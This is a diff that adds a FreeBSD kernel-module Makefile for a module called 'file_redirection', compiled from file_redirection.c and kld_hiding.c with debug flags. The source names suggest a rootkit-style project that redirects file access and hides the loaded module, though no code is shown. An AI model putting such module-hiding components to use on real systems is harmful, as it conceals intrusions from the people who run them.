@@ -1,0 +1,14 @@
+.PATH: ${.CURDIR}/src/
+.OBJDIR: ${.CURDIR}/obj/
+PACKAGE=file_redirection
+# START DEBUG MODE
+DEBUG_FLAGS=-g
+COPTFLAGS=-O0
+CFLAGS=-O0 -pipe
+CFLAGS+=-DDEBUG
+# END DEBUG MODE
+FILESDIR=.
+KMOD=file_redirection
+SRCS=file_redirection.c kld_hiding.c
+
+.include <bsd.kmod.mk>
